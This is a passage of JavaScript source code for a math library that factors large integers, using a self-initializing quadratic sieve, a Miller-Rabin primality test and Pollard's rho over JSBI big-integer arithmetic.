      var x = JSBI.toNumber(JSBI.asUintN(52, a));
      array.push(x);
      a = JSBI.signedRightShift(a, JSBI.BigInt(52));
    }

    return array;
  }

  function FastMod(array, integer) {
    var n = array.length - 1;
    var result = fmod(array[n], integer);

    if (n > 0) {
      var x = fmod(Math.pow(2, 52), integer);

      for (var i = n - 1; i >= 0; i -= 1) {
        result = fmod(result * x + array[i], integer);
      }
    }

    return result;
  } //squareRootModuloOddPrime(4865648, 9749, 2)  // huge size of p**e


  function exp2(x) {
    return Math.pow(2, Math.floor(x)) * Math.exp(Math.LN2 * (x - Math.floor(x)));
  }

  var useMultiplePolynomials = true; // A*x**2 + 2*B*x + C, A = q**2, qInv = q**-1 mod N

  function QuadraticPolynomial(A, B, C, q, qInv, N) {
    this.A = A;
    this.B = B;
    this.C = C;
    this.q = q;
    this.qInv = qInv;
    this.N = N;
    var logA = log(A);
    var u = -Math.exp(log(B) - logA);
    var v = Math.exp(log(N) / 2 - logA);
    this.x1 = u - v;
    this.x2 = u + v;
    this.log2a = logA / Math.LN2;
  }

  QuadraticPolynomial.generator = function (M, primes, N) {
    var isPrime = function (n) {
      if (typeof n !== "number") {
        throw new TypeError();
      }

      if (n < 2) {
        throw new RangeError();
      }

      if (n % 2 === 0) {
        return n === 2;
      }

      if (n % 3 === 0) {
        return n === 3;
      }

      for (var i = 5, max = Math.floor(Math.sqrt(n)); i <= max; i += 6) {
        if (n % i === 0) {
          return false;
        }

        if (n % (i + 2) === 0) {
          return false;
        }
      }

      return true;
    }; // see https://www.cs.virginia.edu/crab/QFS_Simple.pdf for multiple primes optimization


    var getCombinations = function (elements, k) {
      if (elements.length === 0) {
        return [];
      }

      if (k === 0) {
        return [[]];
      }

      if (k === 1) {
        return elements.map(function (e) {
          return [e];
        });
      }

      return getCombinations(elements.slice(1), k - 1).map(function (c) {
        return [elements[0]].concat(c);
      }).concat(getCombinations(elements.slice(1), k));
    };

    var sqrtOfA = JSBI.BigInt(sqrt(JSBI.divide(JSBI.BigInt(sqrt(JSBI.multiply(JSBI.BigInt(2), N))), JSBI.BigInt(M)))); //TODO: !?

    var e = log(sqrtOfA) / Math.log(2);
    var k = Math.max(1, Math.ceil(e / (53 / 4))); // number of small primes
    //console.debug(k);

    var p = Math.round(e <= JSBI.BigInt(1023) ? Math.pow(JSBI.toNumber(sqrtOfA), 1 / k) : Math.pow(Number(sqrtOfA >> e - JSBI.BigInt(1023)), 1 / k) * Math.pow(2, Number(e - JSBI.BigInt(1023)) / k)); //var B = BigInt(primes[primes.length - 1]);
    //if (p <= B) {
    //  p = B + 2n;
    //}
    //p += 3 - p % 4;

    var s = 0;
    var combinations = [];
    var polynomials = [];
    var elements = [];
    QuadraticSieveFactorization.polynomialsCounter = 0;
    return {
      next: function generator() {
        while (polynomials.length === 0) {
          while (combinations.length === 0) {
            var p3 = 0;

            do {
              p3 = p - p % 2 + 1 + (s % 2 === 0 ? s : -1 - s);
              s += 1;
            } while (p3 < 2 || !isPrime(p3) || !isQuadraticResidueModuloPrime(N, p3));

            combinations = getCombinations(elements, k - 1).map(function (c) {
              return [p3].concat(c);
            });
            elements.push(p3); //console.log(elements.length, combinations.length, p**k / Number(sqrtOfA));
          }

          var qPrimes = combinations.pop();
          var q = product(qPrimes.map(function (p) {
            return JSBI.BigInt(p);
          }));
          var qInv = modInverse(maybeJSBI.remainder(q, N), N);

          if (JSBI.equal(qInv, JSBI.BigInt(0))) {
            //TODO: what to do here - ?
            return this.next();
          }

          var A = maybeJSBI.multiply(q, q);
          var Bs = squareRootsModuloOddPrimesProduct(N, qPrimes, 2);

          for (var i = 0; i < Bs.length; i += 1) {
            Bs[i] = JSBI.lessThan(Bs[i], JSBI.BigInt(0)) ? maybeJSBI.subtract(A, Bs[i]) : Bs[i];
          }

          Bs.sort(function (a, b) {
            return maybeJSBI.toNumber(maybeJSBI.subtract(a, b));
          });

          for (var i = 0; i < Bs.length / 2; i += 1) {
            var B = Bs[i];
            var AC = maybeJSBI.subtract(maybeJSBI.multiply(B, B), N);

            if (JSBI.notEqual(maybeJSBI.remainder(AC, A), JSBI.BigInt(0))) {
              throw new Error();
            }

            var C = maybeJSBI.divide(AC, A);
            polynomials.push(new QuadraticPolynomial(A, B, C, q, qInv, N));
          }
        }

        QuadraticSieveFactorization.polynomialsCounter += 1;
        return polynomials.shift();
      }
    };
  };

  QuadraticPolynomial.prototype.X = function (x) {
    return JSBI.multiply(JSBI.add(JSBI.multiply(this.A, JSBI.BigInt(x)), this.B), this.qInv);
  };

  QuadraticPolynomial.prototype.Y = function (x) {
    return JSBI.add(JSBI.add(maybeJSBI.multiply(this.A, maybeJSBI.lessThanOrEqual(maybeJSBI.multiply(x, x), Number.MAX_SAFE_INTEGER) ? JSBI.BigInt(maybeJSBI.multiply(x, x)) : function (a) {
      return maybeJSBI.multiply(a, a);
    }(JSBI.BigInt(x))), JSBI.multiply(this.B, JSBI.BigInt(2 * x))), this.C);
  };

  QuadraticPolynomial.prototype.log2AbsY = function (x) {
    //var v1 = Math.log2(Math.abs(Number(this.Y(x))));
    var v2 = Math.log2(Math.abs(maybeJSBI.subtract(x, this.x1) * maybeJSBI.subtract(x, this.x2))) + this.log2a;
    return v2;
  };

  function thresholdApproximationInterval(polynomial, x, threshold, sieveSize) {
    var w = sieveSize > 2048 ? sieveSize > Math.pow(2, 18) ? 1024 : 256 : 1;

    while (w >= 2 && Math.abs(polynomial.log2AbsY(x + w) - threshold) > 0.5) {
      w /= 2;
    }

    return x + w;
  } // https://ru.wikipedia.org/wiki/ÐÐ»Ð³Ð¾Ñ€Ð¸Ñ‚Ð¼_Ð”Ð¸ÐºÑÐ¾Ð½Ð°
  // https://www.youtube.com/watch?v=TvbQVj2tvgc
  // https://www.rieselprime.de/ziki/Self-initializing_quadratic_sieve


  function congruencesUsingQuadraticSieve(primes, N, sieveSize0) {
    var sieveSize1 = Number(sieveSize0 || 0);

    if (sieveSize1 === 0) {
      sieveSize1 = 3 * Math.pow(2, 14);
      sieveSize1 = Math.min(sieveSize1, Math.ceil(Math.pow(primes[primes.length - 1], 1.15)));
      sieveSize1 = Math.max(sieveSize1, primes[primes.length - 1] + 1);
    } //console.debug('sieveSize1', Math.log2(sieveSize1));


    sieveSize1 += sieveSize1 % 2;
    var sieveSize = sieveSize1;

    if (!(N instanceof JSBI)) {
      throw new TypeError();
    }

    var segmentSize = Math.ceil(sieveSize / Math.ceil(sieveSize / (3 * Math.pow(2, 17))));
    var SIEVE_SEGMENT1 = [];

    for (var i = 0; i < segmentSize; i += 1) {
      SIEVE_SEGMENT1.push(-0);
    }

    var SIEVE_SEGMENT = SIEVE_SEGMENT1.slice(0);
    var twoB = 2 * Math.log2(primes.length === 0 ? Math.sqrt(2) : maybeJSBI.toNumber(primes[primes.length - 1]));
    var largePrimes = new Map(); // faster (?)
    // see https://www.youtube.com/watch?v=TvbQVj2tvgc

    var wheels = [];
    var wheelLogs = [];
    var wheelRoots = [];

    for (var i = 0; i < primes.length; i += 1) {
      var p = primes[i];

      for (var beta = 1, pInBeta = p; pInBeta <= sieveSize; beta += 1, pInBeta = maybeJSBI.multiply(pInBeta, p)) {
        var nmodpInBeta = JSBI.toNumber(JSBI.remainder(N, JSBI.BigInt(pInBeta)));

        if (nmodpInBeta % p === 0) {
          console.warn('N has a factor in prime base', N, p);
        } else {
          if (p === 2) {
            var roots = getSquareRootsModuloTwo(nmodpInBeta, beta);

            for (var j = 0; j < Math.ceil(roots.length / 2); j += 1) {
              wheels.push({
                step: pInBeta,
                proot: 0,
                proot2: 0
              });
              wheelLogs.push(Math.log2(p) * (pInBeta === 2 ? 0.5 : 1));
              wheelRoots.push(roots[j] | 0);
            }
          } else {
            var root = squareRootModuloOddPrime(nmodpInBeta, p, beta);
            wheels.push({
              step: pInBeta,
              proot: 0,
              proot2: 0
            });
            wheelLogs.push(Math.log2(p));
            wheelRoots.push(root | 0);
          }
        }
      }
    }

    var lpStrategy = function (p, polynomial, x) {
      // https://ru.wikipedia.org/wiki/ÐÐ»Ð³Ð¾Ñ€Ð¸Ñ‚Ð¼_Ð”Ð¸ÐºÑÐ¾Ð½Ð°#Ð¡Ñ‚Ñ€Ð°Ñ‚ÐµÐ³Ð¸Ñ_LP
      var lp = largePrimes.get(p);

      if (lp == undefined) {
        // storing polynomial + x has smaller memory usage
        largePrimes.set(p, {
          polynomial: polynomial,
          x: x
        });
      } else {
        var s = JSBI.BigInt(p);
        var sInverse = modInverse(s, N);

        if (JSBI.equal(sInverse, JSBI.BigInt(0))) {
          return new CongruenceOfsquareOfXminusYmoduloN(s, JSBI.BigInt(0), N, null); //?
        } else {
          var X = polynomial.X(x);
          var Y = polynomial.Y(x);
          var lpX = lp.polynomial.X(lp.x);
          var lpY = lp.polynomial.Y(lp.x);
          var X1 = JSBI.remainder(JSBI.multiply(JSBI.multiply(sInverse, lpX), X), N);

          if (JSBI.equal(JSBI.remainder(Y, s), JSBI.BigInt(0)) && JSBI.equal(JSBI.remainder(lpY, s), JSBI.BigInt(0))) {
            var a = JSBI.divide(lpY, s);
            var b = JSBI.divide(Y, s);
            var Y1 = JSBI.multiply(a, b);
            var fa = getSmoothFactorization(a, primes);
            var fb = getSmoothFactorization(b, primes);

            if (fa != null && fb != null) {
              var factorization = fa.concat(fb).sort(function (a, b) {
                return maybeJSBI.subtract(a, b);
              });
              return new CongruenceOfsquareOfXminusYmoduloN(X1, Y1, N, factorization);
            }
          }
        }
      }

      return null;
    };

    var polynomialGenerator = useMultiplePolynomials ? QuadraticPolynomial.generator(sieveSize / 2, primes, N) : null;
    var polynomial = null;

    if (!useMultiplePolynomials) {
      // - Number(baseOffset % BigInt(pInBeta))
      var baseOffset = JSBI.add(JSBI.BigInt(sqrt(N)), JSBI.BigInt(1));
      polynomial = new QuadraticPolynomial(JSBI.BigInt(1), baseOffset, JSBI.subtract(JSBI.multiply(baseOffset, baseOffset), N), JSBI.BigInt(1), JSBI.BigInt(1), N);

      for (var i = 0; i < wheels.length; i += 1) {
        var wheel = wheels[i];
        var pInBeta = wheel.step;
        var offset = JSBI.toNumber(JSBI.remainder(baseOffset, JSBI.BigInt(pInBeta)));
        wheel.proot = +wheelRoots[i] - offset;
        wheel.proot2 = maybeJSBI.unaryMinus(wheelRoots[i]) - offset;
      }
    }

    var invCacheKey = JSBI.BigInt(0);
    var invCache = packedArray(wheels.length);

    var updateWheels = function (polynomial) {
      //recalculate roots based on the formulat:
      //proot = ((-B + root) * modInv(A, pInBeta)) % pInBeta;
      //+some optimizations to minimize bigint usage and modInverseSmall calls
      var AA = FastModBigInt(polynomial.A);
      var BB = FastModBigInt(polynomial.B);
      var useCache = maybeJSBI.equal(polynomial.A, invCacheKey);

      for (var i = wheels.length - 1; i >= 0; i -= 1) {
        var w = wheels[i];
        var pInBeta = w.step;
        var root = wheelRoots[i];
        var invA = 0;

        if (!useCache) {
          //var a = Number(polynomial.A % BigInt(pInBeta));
          var a = FastMod(AA, pInBeta) | 0;
          invA = modInverseSmall(a, pInBeta);
          invCache[i] = invA;
        } else {
          invA = invCache[i];
        }

        if (invA === 0) {//console.log('unsupported A');
          //TODO: ?
        } else {
          //var b = Number(polynomial.B % BigInt(pInBeta));
          var b = FastMod(BB, pInBeta) | 0;
          var proot1 = fmod((0 - b + root) * invA, pInBeta) | 0;
          w.proot = proot1;
          var proot2 = fmod((0 - b - root) * invA, pInBeta) | 0;
          w.proot2 = proot2;
        }
      }

      invCacheKey = polynomial.A;

      if (false) {
        for (var k = 0; k < wheels.length; k += 1) {
          for (var v = 0; v <= 1; v += 1) {
            var x = JSBI.BigInt(v === 0 ? wheels[k].proot : wheels[k].proot2);
            var X = JSBI.add(JSBI.multiply(polynomial.A, x), polynomial.B);
            var Y = JSBI.subtract(JSBI.multiply(X, X), N);

            if (JSBI.notEqual(JSBI.remainder(Y, JSBI.BigInt(wheels[k].step)), JSBI.BigInt(0))) {
              throw new Error();
            }
          }
        }
      }
    };

    var getSmallWheels = function () {
      var n = Math.min(64, wheels.length);
      var indexes = new Array(n);

      for (var i = 0; i < n; i += 1) {
        indexes[i] = i;
      }

      indexes.sort(function (a, b) {
        return maybeJSBI.subtract(wheels[a].step, wheels[b].step);
      });
      var p = 1;
      var i = 0;

      while (i < indexes.length && p * wheels[indexes[i]].step <= 49152) {
        p *= wheels[indexes[i]].step;
        i += 1;
      }

      return indexes.slice(0, i);
    };

    var smallWheels = getSmallWheels();

    var updateSieveSegment = function (segmentStart) {
      var cycleLength = 1;

      for (var i = 0; i < smallWheels.length; i += 1) {
        cycleLength *= wheels[smallWheels[i]].step;
      }

      for (var i = 0; i < cycleLength; i += 1) {
        SIEVE_SEGMENT[i] = -0;
      }

      for (var j = 0; j < smallWheels.length; j += 1) {
        var w = wheels[smallWheels[j]];
        var step = w.step;
        var log2p = wheelLogs[smallWheels[j]];

        for (var k = (w.proot + cycleLength - segmentStart % cycleLength) % step; k < cycleLength; k += step) {
          var _y5;

          _y5 = k, SIEVE_SEGMENT[_y5] = maybeJSBI.add(SIEVE_SEGMENT[_y5], log2p);
        }

        for (var k = (w.proot2 + cycleLength - segmentStart % cycleLength) % step; k < cycleLength; k += step) {
          var _y6;

          _y6 = k, SIEVE_SEGMENT[_y6] = maybeJSBI.add(SIEVE_SEGMENT[_y6], log2p);
        }
      }

      for (var i = cycleLength; i < segmentSize; i += 1) {
        SIEVE_SEGMENT[i] = SIEVE_SEGMENT[i - cycleLength];
      } //for (var j = 0; j < segmentSize; j += 1) {
      //  SIEVE_SEGMENT[j] = -0;
      //}


      var x = smallWheels.length === 0 ? 0 : wheels[smallWheels[smallWheels.length - 1]].step;

      for (var j = 0; j < wheels.length; j += 1) {
        var w = wheels[j];
        var step = w.step;

        if (maybeJSBI.greaterThan(step, x)) {
          var log2p = wheelLogs[j];
          var kpplusr = w.proot;

          while (kpplusr < segmentSize) {
            var _y7;

            _y7 = kpplusr, SIEVE_SEGMENT[_y7] = maybeJSBI.add(SIEVE_SEGMENT[_y7], log2p);
            kpplusr = maybeJSBI.add(kpplusr, step);
          }

          w.proot = kpplusr - segmentSize;
          var kpplusr2 = w.proot2;

          while (kpplusr2 < segmentSize) {
            var _y8;

            _y8 = kpplusr2, SIEVE_SEGMENT[_y8] = maybeJSBI.add(SIEVE_SEGMENT[_y8], log2p);
            kpplusr2 = maybeJSBI.add(kpplusr2, step);
          }

          w.proot2 = kpplusr2 - segmentSize;
        }
      }
    };

    var smoothEntries = [];
    var smoothEntries2 = [];

    var findSmoothEntries = function (offset, polynomial) {
      var j = 0;
      var thresholdApproximation = 0.5;

      while (j < segmentSize) {
        var k = j; // it is slow to compute the threshold on every iteration, so trying to optimize:
        //TODO: the threshold calculation is much more simple in the Youtube videos (?)

        thresholdApproximation = polynomial.log2AbsY(j + offset) - twoB;
        j = thresholdApproximationInterval(polynomial, j + offset, thresholdApproximation + twoB, sieveSize) - offset;
        j = j > segmentSize ? segmentSize : j;

        for (var i = k; i < j; i += 1) {
          if (thresholdApproximation < SIEVE_SEGMENT[i]) {
            smoothEntries.push(i + offset);
            smoothEntries2.push(SIEVE_SEGMENT[i]);
          }
        }
      }
    };

    var i1 = -1;
    var k = 0;
    var iterator = {
      next: function congruencesUsingQuadraticSieve() {
        while (2 * k * sieveSize <= Math.pow(primes[primes.length - 1], 2)) {
          if (i1 === sieveSize) {
            k += 1;
            i1 = -1;
          }

          var offset = useMultiplePolynomials ? -sieveSize / 2 : (k % 2 === 0 ? 1 : -1) * Math.floor((k + 1) / 2) * sieveSize;

          if (i1 === -1) {
            if (useMultiplePolynomials) {
              polynomial = polynomialGenerator.next();
              updateWheels(polynomial);
            }

            smoothEntries.length = 0;
            smoothEntries2.length = 0;

            for (var j = 0; j < wheels.length; j += 1) {
              var w = wheels[j];
              var step = w.step;
              var x = 0 + (w.proot - offset) % step;
              w.proot = x + (x < 0 ? step : 0);
              var x2 = 0 + (w.proot2 - offset) % step;
              w.proot2 = x2 + (x2 < 0 ? step : 0);
            }

            for (var segmentStart = 0; segmentStart < sieveSize; segmentStart += segmentSize) {
              updateSieveSegment(segmentStart);
              findSmoothEntries(offset + segmentStart, polynomial);
            }
          } //Note: separate loop over "smooth entries" is better for performance, seems


          for (var i = i1 + 1; i < smoothEntries.length; i += 1) {
            var x = smoothEntries[i];
            var value = smoothEntries2[i];
            var threshold = polynomial.log2AbsY(x);

            if (maybeJSBI.subtract(threshold, value) < 1) {
              var X = polynomial.X(x);
              var Y = polynomial.Y(x);
              var factorization = getSmoothFactorization(Y, primes);

              if (factorization != null) {
                i1 = i;
                return {
                  value: new CongruenceOfsquareOfXminusYmoduloN(X, Y, N, factorization),
                  done: false
                };
              } else {
                console.count('?');
                /*var p = 1n;
                for (var n = 0; n < wheels.length; n += 1) {
                  var w = wheels[n];
                  for (var v = 0; v <= 1; v += 1) {
                    if ((x - (v === 0 ? wheels[n].proot : wheels[n].proot2)) % w.step === 0) {
                      console.log(w);
                      p *= BigInt(w.step);
                    }
                  }
                }*/
              }
            } else {
              if (maybeJSBI.subtract(threshold, value) < twoB) {
                var p = Math.round(exp2(maybeJSBI.subtract(threshold, value)));
                var c = lpStrategy(p, polynomial, x);

                if (c != null) {
                  i1 = i;
                  return {
                    value: c,
                    done: false
                  };
                }
              }
            }
          }

          i1 = sieveSize;
        }

        return {
          value: undefined,
          done: true
        };
      }
    };

    iterator[globalThis.Symbol.iterator] = function () {
      return this;
    };

    return iterator;
  }

  function gcd(a, b) {
    while (JSBI.notEqual(b, JSBI.BigInt(0))) {
      var r = maybeJSBI.remainder(a, b);
      a = b;
      b = r;
    }

    return a;
  }

  function abs(x) {
    return JSBI.lessThan(x, JSBI.BigInt(0)) ? JSBI.unaryMinus(x) : x;
  }

  function indexOf(sortedArray, x) {
    var min = 0;
    var max = sortedArray.length - 1;

    while (min < max) {
      var mid = Math.ceil((min + max) / 2);

      if (maybeJSBI.greaterThan(sortedArray[mid], x)) {
        max = mid - 1;
      } else {
        min = mid;
      }
    }

    if (maybeJSBI.equal(sortedArray[min], x)) {
      return min;
    }

    return -1;
  }

  function QuadraticSieveFactorization(N) {
    // N - is not a prime
    N = JSBI.BigInt(N);

    for (var k = JSBI.BigInt(1);; k = JSBI.add(k, JSBI.BigInt(1))) {
      var kN = JSBI.multiply(k, N); // https://trizenx.blogspot.com/2018/10/continued-fraction-factorization-method.html#:~:text=optimal%20value :

      var B = Math.min(Math.floor(Math.sqrt(L(kN) / 8)), (1 << 25) - 1);
      var primeBase = primes(B).filter(function (p) {
        return isQuadraticResidueModuloPrime(kN, p);
      });

      for (var i = 0; i < primeBase.length; i += 1) {
        if (JSBI.toNumber(JSBI.remainder(N, JSBI.BigInt(primeBase[i]))) === 0) {
          return JSBI.BigInt(primeBase[i]);
        }
      }

      var congruences = congruencesUsingQuadraticSieve(primeBase, kN); // congruences X_k^2 = Y_k mod N, where Y_k is smooth over the prime base

      var solutions = solve(1 + primeBase.length); // find products of Y_k = Y, so that Y is a perfect square

      solutions.next();
      var c = null;
      var c1 = 0;
      var start = Date.now();
      var last = start;

      while ((c = congruences.next().value) != undefined) {
        c1 += 1;
        var now = Date.now();

        if (maybeJSBI.subtract(now, last) > 5000) {
          console.debug('congruences found: ', c1, '/', primeBase.length, 'expected time: ', maybeJSBI.subtract(now, start) / c1 * primeBase.length);
          last = now;
        }

        var solution = JSBI.equal(c.Y, JSBI.BigInt(0)) ? [c] : solutions.next([c.factorization.map(function (p) {
          return p === -1 ? 0 : 1 + indexOf(primeBase, p);
        }), c]).value;

        if (solution != null) {
          var X = product(solution.map(function (c) {
            return c.X;
          }));
          var Y = product(solution.map(function (c) {
            return c.Y;
          })); // = sqrt(X**2 % N)

          var x = X;
          var y = JSBI.BigInt(sqrt(Y));
          console.assert(JSBI.equal(JSBI.multiply(y, y), JSBI.BigInt(Y)));
          var g = gcd(abs(JSBI.add(x, y)), N);

          if (JSBI.notEqual(g, JSBI.BigInt(1)) && maybeJSBI.notEqual(g, N)) {
            return g;
          }
        }
      }
    }
  }

  QuadraticSieveFactorization.testables = {
    congruencesUsingQuadraticSieve: congruencesUsingQuadraticSieve,
    squareRootModuloOddPrime: squareRootModuloOddPrime,
    isQuadraticResidueModuloPrime: isQuadraticResidueModuloPrime,
    solve: solve,
    QuadraticPolynomial: QuadraticPolynomial,
    thresholdApproximationInterval: thresholdApproximationInterval
  };
  self.QuadraticSieveFactorization = QuadraticSieveFactorization;
})();
var maybeJSBI = {
  toNumber: function toNumber(a) {
    return typeof a === "object" ? JSBI.toNumber(a) : Number(a);
  },
  add: function add(a, b) {
    return typeof a === "object" && typeof b === "object" ? JSBI.add(a, b) : a + b;
  },
  subtract: function subtract(a, b) {
    return typeof a === "object" && typeof b === "object" ? JSBI.subtract(a, b) : a - b;
  },
  multiply: function multiply(a, b) {
    return typeof a === "object" && typeof b === "object" ? JSBI.multiply(a, b) : a * b;
  },
  divide: function divide(a, b) {
    return typeof a === "object" && typeof b === "object" ? JSBI.divide(a, b) : a / b;
  },
  remainder: function remainder(a, b) {
    return typeof a === "object" && typeof b === "object" ? JSBI.remainder(a, b) : a % b;
  },
  exponentiate: function exponentiate(a, b) {
    return typeof a === "object" && typeof b === "object" ? JSBI.exponentiate(a, b) : typeof a === "bigint" && typeof b === "bigint" ? new Function("a", "b", "return a**b")(a, b) : Math.pow(a, b);
  },
  leftShift: function leftShift(a, b) {
    return typeof a === "object" && typeof b === "object" ? JSBI.leftShift(a, b) : a << b;
  },
  signedRightShift: function signedRightShift(a, b) {
    return typeof a === "object" && typeof b === "object" ? JSBI.signedRightShift(a, b) : a >> b;
  },
  bitwiseAnd: function bitwiseAnd(a, b) {
    return typeof a === "object" && typeof b === "object" ? JSBI.bitwiseAnd(a, b) : a & b;
  },
  bitwiseOr: function bitwiseOr(a, b) {
    return typeof a === "object" && typeof b === "object" ? JSBI.bitwiseOr(a, b) : a | b;
  },
  bitwiseXor: function bitwiseXor(a, b) {
    return typeof a === "object" && typeof b === "object" ? JSBI.bitwiseXor(a, b) : a ^ b;
  },
  lessThan: function lessThan(a, b) {
    return typeof a === "object" && typeof b === "object" ? JSBI.lessThan(a, b) : a < b;
  },
  greaterThan: function greaterThan(a, b) {
    return typeof a === "object" && typeof b === "object" ? JSBI.greaterThan(a, b) : a > b;
  },
  lessThanOrEqual: function lessThanOrEqual(a, b) {
    return typeof a === "object" && typeof b === "object" ? JSBI.lessThanOrEqual(a, b) : a <= b;
  },
  greaterThanOrEqual: function greaterThanOrEqual(a, b) {
    return typeof a === "object" && typeof b === "object" ? JSBI.greaterThanOrEqual(a, b) : a >= b;
  },
  equal: function equal(a, b) {
    return typeof a === "object" && typeof b === "object" ? JSBI.equal(a, b) : a === b;
  },
  notEqual: function notEqual(a, b) {
    return typeof a === "object" && typeof b === "object" ? JSBI.notEqual(a, b) : a !== b;
  },
  unaryMinus: function unaryMinus(a) {
    return typeof a === "object" ? JSBI.unaryMinus(a) : -a;
  },
  bitwiseNot: function bitwiseNot(a) {
    return typeof a === "object" ? JSBI.bitwiseNot(a) : ~a;
  }
};


(function () {
  "use strict"; //
  // https://github.com/tc39/proposal-bigint/issues/205
  // https://github.com/tc39/ecma262/issues/1729
  // bitLength(a) = floor(log2(a)) + 1 if a > 0

  function bitLength(a) {
    var s = a.toString(16);
    var c = maybeJSBI.subtract(s.charCodeAt(0), '0'.charCodeAt(0));

    if (c <= 0) {
      throw new RangeError();
    }

    return (s.length - 1) * 4 + (32 - Math.clz32(Math.min(c, 8)));
  } //self.bitLength = bitLength;
  //function min(a, b) {
  //  return a < b ? a : b;
  //}


  var SPLIT = Math.pow(2, Math.ceil(Math.log2((Number.MAX_SAFE_INTEGER + 1) * 2) / 2)) + 1;

  function fma(a, b, p) {
    var at = SPLIT * a;
    var ahi = at - (at - a);
    var alo = a - ahi;
    var bt = SPLIT * b;
    var bhi = bt - (bt - b);
    var blo = b - bhi;
    var e = ahi * bhi + p + ahi * blo + alo * bhi + alo * blo;
    return e;
  }

  function modMultiplySmall(a, b, m) {
    if (typeof a !== 'number' || typeof b !== 'number' || typeof m !== 'number') {
      throw new TypeError();
    }

    if (!(a >= 0 && b >= 0 && a < m && b < m && m <= Number.MAX_SAFE_INTEGER)) {
      throw new RangeError();
    }

    var p = a * b;

    if (p <= Number.MAX_SAFE_INTEGER) {
      return p - Math.floor(p / m) * m;
    }

    var r1 = fma(a, b, -p);
    var q = p / m - (1 + Number.MAX_SAFE_INTEGER) + (1 + Number.MAX_SAFE_INTEGER); // note: this is a confusing line because of the double rounding

    var r2 = 0 - fma(q, m, -p);

    if (r1 > 0) {
      r1 -= m;
    }

    if (r2 < 0) {
      r2 += m;
    }

    var r = r1 + r2;

    if (r < 0) {
      r += m;
    }

    return r;
  }

  function modPowSmall(base, exponent, modulus) {
    // exponent can be huge, use non-recursive variant
    var accumulator = 1;

    while (exponent !== 0) {
      var q = Math.floor(exponent / 2);

      if (exponent !== q + q) {
        accumulator = modMultiplySmall(accumulator, base, modulus);
      }

      exponent = q;
      base = modMultiplySmall(base, base, modulus);
    }

    return accumulator;
  }

  function range(start, end) {
    var a = [];

    for (var i = start; i <= end; i += 1) {
      a.push(i);
    }

    return a;
  } // isPrime implementation is stolen from:
  // https://github.com/peterolson/BigInteger.js
  // https://en.wikipedia.org/wiki/Miller%E2%80%93Rabin_primality_test#Deterministic_variants


  function isPrimeSmall(n) {
    n = maybeJSBI.toNumber(n);

    if (maybeJSBI.greaterThan(n, Number.MAX_SAFE_INTEGER)) {
      throw new RangeError();
    }

    if (n < 2) {
      throw new RangeError();
    }

    if (maybeJSBI.lessThan(primeFactorUsingWheel(n, 2 * 1024), n)) {
      return false;
    }

    if (n < Math.pow(1024, 2)) {
      return true;
    }

    var r = 0;
    var d = n - 1;

    while (d % 2 === 0) {
      d /= 2;
      r += 1;
    } // https://en.wikipedia.org/wiki/Millerâ€“Rabin_primality_test#Testing_against_small_sets_of_bases


    var values = [10, 20, 24, 31, 40, 41, 48, 48, 61, 61, 61, 78, 81];
    var primes = [2, 3, 5, 7, 11, 13, 17, 17, 19, 19, 19, 23, 29];
    var i = 0;
    var x = Math.ceil(Math.log2(n));

    while (x > values[i] && i < values.length) {
      i += 1;
    }

    var bases = null;

    if (i < values.length) {
      bases = primes.slice(0, i + 1);
    } else {
      // https://primes.utm.edu/prove/prove2_3.html
      bases = range(2, Math.floor(1 / Math.log(2) * Math.log(n) * Math.log(Math.log(n))));
    }

    console.assert(maybeJSBI.greaterThan(n, bases[bases.length - 1]));

    for (var iteratora = bases[globalThis.Symbol.iterator](), a = iteratora.next().value; a != null; a = iteratora.next().value) {
      var adn = modPowSmall(a, d, n);

      if (adn !== 1) {
        for (var i = 0, x = adn; x !== n - 1; i += 1, x = modMultiplySmall(x, x, n)) {
          if (i === r - 1) {
            return false;
          }
        }
      }
    }

    return true;
  }

  function abs(a) {
    return maybeJSBI.lessThan(a, maybeJSBI.subtract(a, a)) ? maybeJSBI.unaryMinus(a) : a;
  } // Pollard's rho implementation is stolen from:
  // https://github.com/jiggzson/nerdamer/blob/master/nerdamer.core.js
  // https://en.wikipedia.org/wiki/Pollard%27s_rho_algorithm#C_code_sample
  // TODO: library (?)


  function factorByPollardRho(n, x0, c, maxIterations) {
    x0 = x0 == undefined ? JSBI.BigInt(2) : x0;
    c = c == undefined ? JSBI.BigInt(1) : c;
    maxIterations = maxIterations == undefined ? 1 / 0 : maxIterations;
    var zero = maybeJSBI.subtract(n, n);
    var one = maybeJSBI.divide(n, n);

    function modMultiply(a, b, mod) {
      if (typeof mod === "number") {
        return modMultiplySmall(a, b, mod);
      }

      return maybeJSBI.remainder(maybeJSBI.multiply(a, b), mod);
    }

    function gcd(a, b) {
      while (maybeJSBI.notEqual(b, zero)) {
        var r = maybeJSBI.remainder(a, b);
        a = b;
        b = r;
      }

      return a;
    }

    function f(x, c, mod) {
      var y = maybeJSBI.subtract(modMultiply(x, x, mod), c);
      return maybeJSBI.lessThan(y, zero) ? maybeJSBI.add(y, mod) : y;
    }

    if (JSBI.equal(maybeJSBI.remainder(n, x0), JSBI.BigInt(0))) {
      //?
      return x0;
    }

    var xFixed = x0;
    var cycleSize = 2;
    var x = x0;

    while (cycleSize <= Math.pow(2, maxIterations)) {
      var product = one;
      var productStart = x;
      var found = false;

      for (var count = 1; found || count <= cycleSize; count += 1) {
        x = f(x, c, n);

        if (count === cycleSize / 2) {
          productStart = x;
        }

        if (count > cycleSize / 2) {
          // see https://maths-people.anu.edu.au/~brent/pd/rpb051i.pdf
          //factor = gcd(abs(x - xFixed), n);
          product = found ? abs(maybeJSBI.subtract(x, xFixed)) : modMultiply(product, abs(maybeJSBI.subtract(x, xFixed)), n);

          if (found || count === cycleSize || count % 128 === 0) {
            // https://en.wikipedia.org/wiki/Pollard%27s_rho_algorithm#Variants
            var factor = gcd(product, n);

            if (maybeJSBI.notEqual(factor, one)) {
              if (!found) {
                //cycleSize *= 2;
                x = productStart;
                found = true;
              } else {
                return factor;
              }
            }

            product = one;
            productStart = x;
          }
        }
      }

      cycleSize *= 2;
      xFixed = x;
    }

    return one;
  }

  function factorByPollardRhoWrapper(n, maxIterations) {
    maxIterations = maxIterations == undefined ? 1 / 0 : maxIterations;
    var small = typeof n === "number";

    if (small && isPrimeSmall(n) || !small && isPrime(n)) {
      return n;
    }

    var x0 = 2 - 1;
    var g = n;

    do {
      x0 += 1;
      g = small ? factorByPollardRho(n, x0, 1, maxIterations) : factorByPollardRho(n, JSBI.BigInt(x0), JSBI.BigInt(1), maxIterations);
    } while (maybeJSBI.equal(g, n));

    return g;
  }

  var WHEEL3 = [1, 2, 2, 4, 2, 4, 2, 4, 6, 2, 6];

  function remainder(n, i) {
